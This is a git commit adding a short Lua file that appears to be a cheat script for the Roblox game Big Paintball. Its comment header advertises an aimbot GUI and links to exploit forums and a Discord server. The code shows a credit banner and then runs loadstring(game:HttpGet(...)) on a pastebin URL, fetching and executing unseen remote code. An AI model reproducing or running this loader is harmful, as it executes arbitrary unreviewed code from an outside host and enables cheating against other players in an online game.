364ae107427b8df9b46a3d51dd7e3ef3fb86ff5b
MysticD3AD <30682549+MysticD3AD@users.noreply.github.com>
2019-12-03 17:38:28 +1100

    Create BigPaintball.lua

---
+++ BigPaintball.lua
@@ -0,0 +1,22 @@
+--[[
+Big Fucker GUI
+Made by:
+Discord: Oliver#2434
+V3rm: https://v3rmillion.net/member.php?action=profile&uid=491138
+Novo: https://novo.fm/member.php?action=profile&uid=1380
+
+Discord Server: https://discord.gg/f7HfKZs
+- Join for more scripts (eventually)
+- Recommend games for me to make scripts for
+
+Keybinds:
+T - Open/Close GUI
+RMB - Activate Aimbot
+]]
+
+local m = Instance.new("Message")
+m.Parent = Workspace
+m.Text = "Script provided by MysticD3AD | Meow Leaf#4391"
+wait(6)
+m:Remove()
+loadstring(game:HttpGet("https://www.pastebin.com/raw/PuaaGKsT"))()
